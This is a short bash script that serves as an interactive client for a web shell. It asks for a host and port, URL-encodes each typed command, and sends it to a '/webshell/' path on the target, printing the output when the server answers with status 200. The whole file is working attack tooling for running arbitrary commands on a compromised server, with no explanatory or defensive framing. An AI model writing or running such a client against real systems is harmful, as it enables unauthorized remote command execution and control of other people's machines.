#!/bin/bash

read -p 'Host: ' host
read -p 'Port: ' port

while true; do
  read -p '$ ' raw_command
  command=$(printf %s "${raw_command}" | jq -sRr @uri)

  response=$(curl -s -w "%{http_code}" -o /dev/null "http://${host}:${port}/webshell/${command}")
  http_code=$(tail -n1 <<< "$response")

  # Check if the HTTP status code is a valid integer
  if [[ "$http_code" =~ ^[0-9]+$ ]]; then
    if [ "$http_code" -eq 200 ]; then
      curl "http://${host}:${port}/webshell/${command}"
    else
      echo "Error: HTTP status code $http_code"
    fi
  else
    echo "Error: Invalid HTTP status code received"
  fi
done
